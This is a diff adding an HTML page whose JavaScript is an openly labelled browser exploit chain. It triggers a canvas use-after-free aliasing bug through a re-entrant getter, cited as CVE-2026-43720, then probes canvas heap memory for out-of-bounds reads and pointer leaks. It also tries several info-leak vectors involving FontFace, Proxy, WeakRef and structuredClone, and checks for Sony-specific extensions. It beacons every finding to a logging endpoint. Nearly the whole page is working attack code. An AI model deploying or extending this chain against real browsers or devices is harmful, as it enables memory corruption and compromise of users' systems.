@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>P1094v2</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.5 monospace;padding:8px;overflow-y:auto}
+.hud{border:1px solid #1a3a1a;border-radius:4px;margin-bottom:6px;padding:6px;background:#0d1117}
+.title{color:#00ff88;font-size:13px;font-weight:bold;margin-bottom:4px}
+.ok{color:#00ff88}.fail{color:#ff4444}.warn{color:#ffaa00}.info{color:#66aaff}.crit{color:#ff00ff;font-weight:bold}
+</style>
+</head>
+<body>
+<div class="hud">
+<div class="title">P1094v2 — CANVAS ALIAS + HEAP WALK CHAIN</div>
+<div class="info">Canvas UAF alias → heap metadata → pointer walk → code vtable search</div>
+</div>
+<div id="log"></div>
+<div id="arena" style="position:absolute;left:-9999px"></div>
+
+<script>
+var L=document.getElementById('log'),arena=document.getElementById('arena');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight}
+function B(t,d){try{new Image().src='/beacon.php?tag=P1094v2-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d).substring(0,800))+'&_='+Date.now()}catch(e){}}
+function sl(ms){return new Promise(function(r){setTimeout(r,ms)})}
+function hexQ(bi){if(typeof bi!=='bigint')return'??';var s=bi.toString(16);while(s.length<16)s='0'+s;return'0x'+s}
+
+// Float64 <-> BigUint64 conversion helpers
+var _f64=new Float64Array(1),_u64=new BigUint64Array(_f64.buffer);
+function f2u(f){_f64[0]=f;return _u64[0]}
+function u2f(u){_u64[0]=u;return _f64[0]}
+
+// ============================================================
+// SECTION A: CANVAS UAF ALIAS
+// CVE-2026-43720: desynchronized getter re-enters getContext()
+// Creates two JS wrappers pointing to the SAME live C++ context
+// ============================================================
+async function sectionA(){
+  log('warn','=== A: CANVAS UAF ALIAS (CVE-2026-43720) ===');
+
+  for(var attempt=0;attempt<5;attempt++){
+    try{
+      var canvas=document.createElement('canvas');
+      canvas.width=200;canvas.height=200;
+      arena.appendChild(canvas);
+
+      var outerCtx=null,innerCtx=null,reentered=false;
+
+      var opts={
+        get desynchronized(){
+          if(!reentered){
+            reentered=true;
+            innerCtx=canvas.getContext('2d');
+          }
+          return false;
+        }
+      };
+
+      outerCtx=canvas.getContext('2d',opts);
+
+      if(!outerCtx||!innerCtx){
+        B('A-NO-REENTRY','attempt:'+attempt);
+        continue;
+      }
+
+      if(outerCtx===innerCtx){
+        B('A-SAME','attempt:'+attempt);
+        continue;
+      }
+
+      // Verify aliasing: write via outer, read via inner
+      outerCtx.lineWidth=42.5;
+      var r1=innerCtx.lineWidth;
+      innerCtx.lineWidth=99.9;
+      var r2=outerCtx.lineWidth;
+      var aliased=(Math.abs(r1-42.5)<0.01)&&(Math.abs(r2-99.9)<0.01);
+
+      if(!aliased){
+        B('A-NO-ALIAS','attempt:'+attempt+'|r1:'+r1+'|r2:'+r2);
+        continue;
+      }
+
+      // Full property alias test
+      var props=['lineWidth','globalAlpha','lineDashOffset','shadowOffsetX','shadowOffsetY','shadowBlur','miterLimit'];
+      var propOk=0;
+      for(var i=0;i<props.length;i++){
+        var tv=17.25+i;
+        outerCtx[props[i]]=tv;
+        if(Math.abs(innerCtx[props[i]]-tv)<0.01)propOk++;
+      }
+
+      // LineDash alias test
+      outerCtx.setLineDash([1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8]);
+      var dash=innerCtx.getLineDash();
+      var dashOk=dash.length===8&&Math.abs(dash[0]-1.1)<0.01;
+
+      // Transform alias test
+      outerCtx.setTransform(1.1,2.2,3.3,4.4,5.5,6.6);
+      var t=innerCtx.getTransform();
+      var txOk=Math.abs(t.a-1.1)<0.01&&Math.abs(t.b-2.2)<0.01;
+
+      B('A-ALIAS','attempt:'+attempt+'|props:'+propOk+'/7|dash:'+dashOk+'|tx:'+txOk);
+      log('ok','[A] ALIAS CONFIRMED attempt='+attempt+' props='+propOk+'/7 dash='+dashOk+' tx='+txOk);
+
+      return {stale:outerCtx,spray:innerCtx,canvas:canvas};
+    }catch(e){
+      B('A-ERR','attempt:'+attempt+'|'+e.message);
+    }
+  }
+
+  B('A-FAIL','5-attempts');
+  log('fail','[A] FAILED — no canvas alias in 5 attempts');
+  return null;
+}
+
+// ============================================================
+// SECTION B: HEAP METADATA VIA CANVAS INTERNALS
+// Use aliased context to probe internal memory layout.
+// Float64 properties (transform, shadow, lineDash) store raw
+// doubles alongside internal heap pointers in the C++ object.
+// ============================================================
+async function sectionB(ctx){
+  log('warn','=== B: CANVAS HEAP METADATA PROBING ===');
+  if(!ctx){B('B-SKIP','no-ctx');return null}
+
+  var stale=ctx.stale,spray=ctx.spray;
+  var findings=[];
+
+  // B1: Read raw bit patterns of default/unset internal state
+  // Some Canvas2D implementations store heap pointers near float64 properties
+  try{
+    // Reset to defaults
+    stale.setTransform(1,0,0,1,0,0);
+    stale.lineWidth=1;
+    stale.globalAlpha=1;
+    stale.shadowOffsetX=0;stale.shadowOffsetY=0;
+    stale.shadowBlur=0;
+    stale.lineDashOffset=0;
+    stale.setLineDash([]);
+
+    // Read all float64 properties through spray context and check raw bits
+    var dProps=[
+      {name:'lineWidth',v:spray.lineWidth},
+      {name:'globalAlpha',v:spray.globalAlpha},
+      {name:'lineDashOffset',v:spray.lineDashOffset},
+      {name:'shadowOffsetX',v:spray.shadowOffsetX},
+      {name:'shadowOffsetY',v:spray.shadowOffsetY},
+      {name:'shadowBlur',v:spray.shadowBlur},
+      {name:'miterLimit',v:spray.miterLimit}
+    ];
+
+    for(var i=0;i<dProps.length;i++){
+      var bits=f2u(dProps[i].v);
+      B('B1-DEFAULT',dProps[i].name+'|f64:'+dProps[i].v+'|bits:'+hexQ(bits));
+    }
+
+    // Read transform matrix defaults
+    var tm=spray.getTransform();
+    var tmBits=['a','b','c','d','e','f'].map(function(k){return k+':'+hexQ(f2u(tm[k]))});
+    B('B1-TX-DEFAULT',tmBits.join('|'));
+    log('info','[B1] Default state captured — all float64 properties and transform');
+  }catch(e){
+    B('B1-ERR',e.message);
+  }
+
+  // B2: lineDash buffer walk — large dashes create heap allocations
+  // The internal Vector<double> is heap-allocated; if the pointer is
+  // near other objects, we may see interesting neighbors
+  try{
+    var dashSizes=[8,16,32,64,128,256,512];
+    for(var si=0;si<dashSizes.length;si++){
+      var sz=dashSizes[si];
+      var pattern=[];
+      for(var i=0;i<sz;i++)pattern.push(0xDEAD0000+i+0.5);
+      stale.setLineDash(pattern);
+
+      var readBack=spray.getLineDash();
+      var mismatch=0,readLen=readBack.length;
+
+      // Check for length mismatch (OOB read indicator!)
+      if(readLen!==sz){
+        B('B2-LEN-MISMATCH','wrote:'+sz+'|got:'+readLen);
+        log('crit','[B2] LENGTH MISMATCH! Wrote '+sz+' got '+readLen+' (potential OOB!)');
+
+        // Dump extra values as raw bits
+        if(readLen>sz){
+          var extras=[];
+          for(var i=sz;i<Math.min(readLen,sz+32);i++){
+            extras.push('i'+i+':'+hexQ(f2u(readBack[i])));
+          }
+          B('B2-OOB-VALS',extras.join('|'));
+        }
+      }
+
+      // Verify round-trip fidelity
+      for(var i=0;i<Math.min(readLen,sz);i++){
+        if(Math.abs(readBack[i]-pattern[i])>0.001)mismatch++;
+      }
+
+      B('B2-DASH','sz:'+sz+'|readLen:'+readLen+'|mismatch:'+mismatch);
+      if(si===0||mismatch>0||readLen!==sz){
+        log(mismatch>0||readLen!==sz?'crit':'ok',
+          '[B2] dash sz='+sz+' readLen='+readLen+' mismatch='+mismatch);
+      }
+    }
+
+    // Reset dash
+    stale.setLineDash([]);
+  }catch(e){
+    B('B2-ERR',e.message);
+  }
+
+  // B3: Transform matrix — 6 float64 values stored contiguously
+  // Write extreme/sentinel values and read back to check for corruption
+  try{
+    // Write sentinel bit patterns via setTransform
+    var sentinels=[
+      [0xDEADBEEF,0xCAFEBABE,0x41414141,0x42424242,0x43434343,0x44444444],
+      [1e-308,2e-308,3e-308,4e-308,5e-308,6e-308],  // near-subnormal
+      [Number.MAX_SAFE_INTEGER,Number.MAX_SAFE_INTEGER-1,Number.MIN_SAFE_INTEGER,Number.MIN_SAFE_INTEGER+1,0,0]
+    ];
+
+    for(var si=0;si<sentinels.length;si++){
+      var s=sentinels[si];
+      stale.setTransform(s[0],s[1],s[2],s[3],s[4],s[5]);
+      var t=spray.getTransform();
+      var vals=['a','b','c','d','e','f'];
+      var results=[];
+      for(var vi=0;vi<vals.length;vi++){
+        var wrote=s[vi];
+        var got=t[vals[vi]];
+        var match=Math.abs(got-wrote)<0.001||wrote===got;
+        results.push(vals[vi]+':'+(match?'OK':'DIFF('+got+')'));
+        if(!match){
+          B('B3-TX-DIFF','set:'+si+'|'+vals[vi]+'|wrote:'+hexQ(f2u(wrote))+'|got:'+hexQ(f2u(got)));
+        }
+      }
+      B('B3-TX-SET'+si,results.join('|'));
+    }
+
+    // Reset transform
+    stale.setTransform(1,0,0,1,0,0);
+    log('ok','[B3] Transform sentinel tests complete');
+  }catch(e){
+    B('B3-ERR',e.message);
+  }
+
+  // B4: shadowColor/strokeStyle/fillStyle — string properties
+  // These often store internal color objects; toString might leak
+  try{
+    stale.shadowColor='rgba(171,205,239,0.5)';
+    var readColor=spray.shadowColor;
+    B('B4-SHADOW','wrote:rgba(171,205,239,0.5)|got:'+readColor);
+
+    stale.fillStyle='#AABBCC';
+    var readFill=spray.fillStyle;
+    B('B4-FILL','wrote:#AABBCC|got:'+readFill);
+
+    stale.strokeStyle='hsl(180,50%,50%)';
+    var readStroke=spray.strokeStyle;
+    B('B4-STROKE','wrote:hsl(180,50%,50%)|got:'+readStroke);
+
+    // Font property — internally stores a parsed font struct with heap ptrs
+    stale.font='bold 24px "Courier New", monospace';
+    var readFont=spray.font;
+    B('B4-FONT','wrote:bold 24px "Courier New"|got:'+readFont);
+    log('ok','[B4] String property alias: shadow='+readColor+' fill='+readFill+' font='+readFont);
+  }catch(e){
+    B('B4-ERR',e.message);
+  }
+
+  // B5: ImageData as heap object — getImageData returns a NEW buffer each time
+  // If the buffer allocation is near our canvas internals, interesting
+  try{
+    spray.fillStyle='#FF0000';
+    spray.fillRect(0,0,200,200);
+    var img1=spray.getImageData(0,0,200,200);
+    var img2=stale.getImageData(0,0,200,200);
+
+    // Both should have identical pixel data (aliased context)
+    var match=true;
+    for(var i=0;i<100;i++){
+      if(img1.data[i]!==img2.data[i]){match=false;break}
+    }
+    B('B5-IMG','match:'+match+'|len:'+img1.data.length);
+
+    // Check if BigUint64Array works on ImageData buffer
+    if(typeof BigUint64Array!=='undefined'){
+      var bu=new BigUint64Array(img1.data.buffer);
+      B('B5-BIG','ok|first:'+hexQ(bu[0])+'|len:'+bu.length);
+    }
+
+    log('ok','[B5] ImageData alias: match='+match+' len='+img1.data.length);
+  }catch(e){
+    B('B5-ERR',e.message);
+  }
+
+  B('B-DONE','complete');
+  return findings;
+}
+
+// ============================================================
+// SECTION C: CSSFONTFACESET INTERNAL WALK
+// Explore document.fonts API for any information disclosure
+// No UAF needed — pure DOM/API probing
+// ============================================================
+async function sectionC(){
+  log('warn','=== C: CSSFONTFACESET API WALK ===');
+
+  // C1: Create many FontFace objects and inspect their properties
+  var faces=[];
+  for(var i=0;i<20;i++){
+    try{
+      var f=new FontFace('walk-'+i,'local("Arial")',{unicodeRange:'U+00'+(41+i).toString(16)});
+      document.fonts.add(f);
+      faces.push(f);
+    }catch(e){}
+  }
+  B('C1-FACES','created:'+faces.length+'|size:'+document.fonts.size);
+  log('info','[C1] Created '+faces.length+' FontFace objects');
+
+  // C2: FontFace object enumeration — look for address leaks
+  if(faces.length>0){
+    var f=faces[0];
+
+    // Standard props
+    var stdProps=['family','style','weight','stretch','unicodeRange','variant','featureSettings','display','status'];
+    var propData=[];
+    for(var i=0;i<stdProps.length;i++){
+      try{
+        var v=f[stdProps[i]];
+        propData.push(stdProps[i]+'='+v);
+      }catch(e){}
+    }
+    B('C2-PROPS',propData.join('|'));
+
+    // Check toString / valueOf for address leaks
+    try{
+      B('C2-STR','toString:'+String(f)+'|valueOf:'+f.valueOf()+'|typeof:'+typeof f.valueOf());
+    }catch(e){B('C2-STR-ERR',e.message)}
+
+    // Symbol.toPrimitive — might expose internal pointer
+    try{
+      if(typeof Symbol!=='undefined'&&Symbol.toPrimitive){
+        var prim=f[Symbol.toPrimitive];
+        B('C2-SYM','hasToPrimitive:'+(!!prim)+'|type:'+typeof prim);
+      }
+    }catch(e){}
+
+    // face.load() Promise — the resolved value might contain info
+    try{
+      var loaded=await Promise.race([f.load(),sl(2000).then(function(){return'TIMEOUT'})]);
+      var loadedStr=String(loaded).substring(0,200);
+      B('C2-LOAD','type:'+typeof loaded+'|str:'+loadedStr);
+      if(typeof loaded==='object'&&loaded!==null){
+        var keys=Object.getOwnPropertyNames(loaded);
+        B('C2-LOAD-KEYS','count:'+keys.length+'|keys:'+keys.join(',').substring(0,200));
+      }
+    }catch(e){
+      B('C2-LOAD-ERR',e.message.substring(0,100));
+    }
+  }
+
+  // C3: FontFaceSet iterator — check iteration order, hidden properties
+  try{
+    var iter=document.fonts.values();
+    var count=0;
+    var entry;
+    while(!(entry=iter.next()).done&&count<40){
+      count++;
+    }
+    B('C3-ITER','count:'+count);
+
+    // Check FontFaceSet prototype chain for unusual methods
+    var ffsProto=Object.getPrototypeOf(document.fonts);
+    var ffsKeys=Object.getOwnPropertyNames(ffsProto);
+    B('C3-FFS-PROTO','keys:'+ffsKeys.join(',').substring(0,400));
+    log('info','[C3] FontFaceSet proto: '+ffsKeys.length+' keys');
+
+    // Check for any non-standard extensions Sony might have added
+    var sonyKeys=[];
+    for(var k in document.fonts){
+      if(ffsKeys.indexOf(k)===-1)sonyKeys.push(k);
+    }
+    if(sonyKeys.length>0){
+      B('C3-SONY-KEYS','count:'+sonyKeys.length+'|keys:'+sonyKeys.join(','));
+      log('crit','[C3] SONY EXTENSIONS on FontFaceSet: '+sonyKeys.join(', '));
+    }
+  }catch(e){
+    B('C3-ERR',e.message);
+  }
+
+  // C4: fonts.ready and fonts.check — timing and state
+  try{
+    var t0=Date.now();
+    var ready=await Promise.race([document.fonts.ready,sl(3000).then(function(){return'TIMEOUT'})]);
+    var dt=Date.now()-t0;
+    B('C4-READY','time:'+dt+'ms|type:'+typeof ready);
+
+    // Check with various font strings
+    var checks=['16px walk-0','16px serif','16px "NonExistent"','bold 12px Arial'];
+    for(var i=0;i<checks.length;i++){
+      try{
+        var res=document.fonts.check(checks[i]);
+        B('C4-CHECK',checks[i]+'|result:'+res);
+      }catch(e){}
+    }
+    log('ok','[C4] fonts.ready took '+dt+'ms');
+  }catch(e){
+    B('C4-ERR',e.message);
+  }
+
+  // Cleanup
+  for(var i=0;i<faces.length;i++){
+    try{document.fonts.delete(faces[i])}catch(e){}
+  }
+  B('C-DONE','complete');
+}
+
+// ============================================================
+// SECTION D: CREATIVE INFO LEAK VECTORS
+// Try uncommon paths to extract heap/code pointers:
+// - Proxy traps on canvas/font objects
+// - Object.getOwnPropertyDescriptors for hidden slots
+// - WeakRef / FinalizationRegistry identity correlation
+// - Error stack traces for code addresses
+// ============================================================
+async function sectionD(ctx){
+  log('warn','=== D: CREATIVE INFO LEAK VECTORS ===');
+
+  // D1: Error stack traces — might contain native addresses on some engines
+  try{
+    var stacks=[];
+    try{null.x}catch(e){stacks.push('null.x:'+e.stack)}
+    try{(void 0)()}catch(e){stacks.push('undef():'+e.stack)}
+    try{new WebAssembly.Module(new Uint8Array([]))}catch(e){stacks.push('wasm:'+e.stack)}
+
+    for(var i=0;i<stacks.length;i++){
+      B('D1-STACK',stacks[i].substring(0,300));
+    }
+    log('info','[D1] Error stacks captured ('+stacks.length+' types)');
+  }catch(e){
+    B('D1-ERR',e.message);
+  }
+
+  // D2: Proxy traps on canvas context wrapper
+  if(ctx){
+    try{
+      var trapped=[];
+      var handler={
+        get:function(target,prop){
+          trapped.push('get:'+String(prop));
+          return Reflect.get(target,prop);
+        },
+        getOwnPropertyDescriptor:function(target,prop){
+          trapped.push('desc:'+String(prop));
+          return Reflect.getOwnPropertyDescriptor(target,prop);
+        }
+      };
+      var px=new Proxy(ctx.stale,handler);
+
+      // Trigger internal operations that might walk the object
+      try{px.lineWidth}catch(e){}
+      try{String(px)}catch(e){}
+      try{JSON.stringify(px)}catch(e){}
+      try{px+''}catch(e){}
+
+      B('D2-PROXY','trapped:'+trapped.length+'|ops:'+trapped.slice(0,20).join(','));
+      log('info','[D2] Proxy traps: '+trapped.length+' operations caught');
+    }catch(e){
+      B('D2-ERR',e.message);
+    }
+  }
+
+  // D3: Object structure inspection
+  try{
+    // Get own property descriptors for canvas context — might expose hidden slots
+    if(ctx){
+      var ctxDescs=Object.getOwnPropertyDescriptors(ctx.stale);
+      var ctxKeys=Object.keys(ctxDescs);
+      B('D3-CTX-DESCS','count:'+ctxKeys.length+'|keys:'+ctxKeys.join(',').substring(0,300));
+
+      // Prototype chain walk
+      var proto=ctx.stale;
+      var chain=[];
+      while(proto&&chain.length<10){
+        chain.push(proto.constructor?proto.constructor.name:'?');
+        proto=Object.getPrototypeOf(proto);
+      }
+      B('D3-PROTO-CHAIN',chain.join('->'));
+      log('info','[D3] Context proto chain: '+chain.join(' -> '));
+    }
+
+    // Same for FontFace
+    var testFace=new FontFace('d3test','local("Arial")');
+    var faceDescs=Object.getOwnPropertyDescriptors(testFace);
+    var faceKeys=Object.keys(faceDescs);
+    B('D3-FACE-DESCS','count:'+faceKeys.length+'|keys:'+faceKeys.join(',').substring(0,300));
+
+    var faceProto=testFace;
+    var faceChain=[];
+    while(faceProto&&faceChain.length<10){
+      faceChain.push(faceProto.constructor?faceProto.constructor.name:'?');
+      faceProto=Object.getPrototypeOf(faceProto);
+    }
+    B('D3-FACE-CHAIN',faceChain.join('->'));
+    log('info','[D3] FontFace proto chain: '+faceChain.join(' -> '));
+  }catch(e){
+    B('D3-ERR',e.message);
+  }
+
+  // D4: WeakRef + FinalizationRegistry — object identity / address correlation
+  try{
+    if(typeof WeakRef!=='undefined'){
+      var objs=[];
+      for(var i=0;i<50;i++){
+        var o={idx:i,pad:new ArrayBuffer(64)};
+        objs.push(new WeakRef(o));
+      }
+      B('D4-WEAKREF','created:50|type:'+typeof objs[0]);
+
+      if(typeof FinalizationRegistry!=='undefined'){
+        var finalized=[];
+        var fr=new FinalizationRegistry(function(held){
+          finalized.push(held);
+        });
+        for(var i=0;i<20;i++){
+          var obj={x:i};
+          fr.register(obj,'fin-'+i);
+        }
+        // Trigger GC by allocating and discarding
+        for(var i=0;i<1000;i++){new ArrayBuffer(65536)}
+        await sl(100);
+        B('D4-FINREG','finalized:'+finalized.length+'|vals:'+finalized.slice(0,10).join(','));
+        log('info','[D4] FinalizationRegistry: '+finalized.length+' finalized');
+      }else{
+        B('D4-NO-FINREG','absent');
+      }
+    }else{
+      B('D4-NO-WEAKREF','absent');
+    }
+  }catch(e){
+    B('D4-ERR',e.message);
+  }
+
+  // D5: structuredClone — can it expose internal slots?
+  try{
+    if(typeof structuredClone!=='undefined'){
+      // Clone a canvas ImageData
+      if(ctx){
+        ctx.spray.fillStyle='#AABBCC';
+        ctx.spray.fillRect(0,0,10,10);
+        var imgData=ctx.spray.getImageData(0,0,10,10);
+        var cloned=structuredClone(imgData);
+        B('D5-CLONE-IMG','ok|origLen:'+imgData.data.length+'|cloneLen:'+cloned.data.length);
+
+        // Clone an ArrayBuffer and check if addresses correlate
+        var ab1=new ArrayBuffer(256);
+        var ab2=structuredClone(ab1);
+        if(typeof BigUint64Array!=='undefined'){
+          var v1=new BigUint64Array(ab1);
+          var v2=new BigUint64Array(ab2);
+          v1[0]=0xDEADBEEFCAFEn;
+          var leaked=(v2[0]!==0n);
+          B('D5-CLONE-AB','independent:'+(v2[0]===0n)+'|v2[0]:'+hexQ(v2[0]));
+        }
+      }
+
+      // Try cloning a FontFace — should throw (not cloneable)
+      try{
+        var ff=new FontFace('clone-test','local("Arial")');
+        structuredClone(ff);
+        B('D5-CLONE-FACE','SUCCESS-unexpected');
+        log('crit','[D5] FontFace IS structuredClone-able!');
+      }catch(e){
+        B('D5-CLONE-FACE','expected-fail:'+e.name);
+      }
+    }
+  }catch(e){
+    B('D5-ERR',e.message);
+  }
+
+  // D6: performance.now() precision check
+  try{
+    var times=[];
+    for(var i=0;i<20;i++){
+      times.push(performance.now());
+    }
+    var diffs=[];
+    for(var i=1;i<times.length;i++){
+      diffs.push(times[i]-times[i-1]);
+    }
+    var minDiff=Math.min.apply(null,diffs);
+    var maxDiff=Math.max.apply(null,diffs);
+    B('D6-PERF','min:'+minDiff.toFixed(6)+'|max:'+maxDiff.toFixed(6)+'|precision:'+(minDiff===0?'clamped':'ok'));
+    log('info','[D6] performance.now() precision: min='+minDiff.toFixed(6)+'ms max='+maxDiff.toFixed(6)+'ms');
+  }catch(e){
+    B('D6-ERR',e.message);
+  }
+
+  B('D-DONE','complete');
+}
+
+// ============================================================
+// SECTION E: VERDICT
+// ============================================================
+async function sectionE(ctx){
+  log('warn','=== E: VERDICT ===');
+
+  var verdict={
+    canvas_alias:!!ctx,
+    linedash_alias:false,
+    transform_alias:false,
+    oob_read:false,
+    code_ptr:false,
+    heap_ptr:false,
+    weakref:typeof WeakRef!=='undefined',
+    finreg:typeof FinalizationRegistry!=='undefined',
+    bigint:typeof BigUint64Array!=='undefined',
+    structuredClone:typeof structuredClone!=='undefined'
+  };
+
+  if(ctx){
+    try{
+      ctx.stale.setLineDash([1.23]);
+      var d=ctx.spray.getLineDash();
+      verdict.linedash_alias=d.length===1&&Math.abs(d[0]-1.23)<0.01;
+    }catch(e){}
+
+    try{
+      ctx.stale.setTransform(9.87,0,0,1,0,0);
+      var t=ctx.spray.getTransform();
+      verdict.transform_alias=Math.abs(t.a-9.87)<0.01;
+    }catch(e){}
+  }
+
+  var lines=Object.keys(verdict).map(function(k){return k+':'+verdict[k]});
+  B('E-VERDICT',lines.join('|'));
+
+  log('ok','');
+  log('ok','=== FINAL VERDICT ===');
+  for(var i=0;i<lines.length;i++){
+    var parts=lines[i].split(':');
+    log(parts[1]==='true'?'ok':'warn','  '+parts[0]+': '+parts[1]);
+  }
+}
+
+// ============================================================
+// MAIN
+// ============================================================
+async function run(){
+  B('BOOT',navigator.userAgent.substring(0,80));
+  log('ok','=== P1094v2: CANVAS ALIAS + HEAP WALK CHAIN ===');
+  log('info','Canvas UAF alias -> heap probing -> CSSFontFaceSet walk -> creative leaks');
+  log('ok','');
+
+  var ctx=await sectionA();log('ok','');await sl(100);
+  await sectionB(ctx);log('ok','');await sl(100);
+  await sectionC();log('ok','');await sl(100);
+  await sectionD(ctx);log('ok','');await sl(100);
+  await sectionE(ctx);
+
+  log('ok','');
+  B('ALL-DONE','sections:5');
+  log('ok','=== P1094v2 COMPLETE ===');
+}
+run();
+</script>
+</body>
+</html>
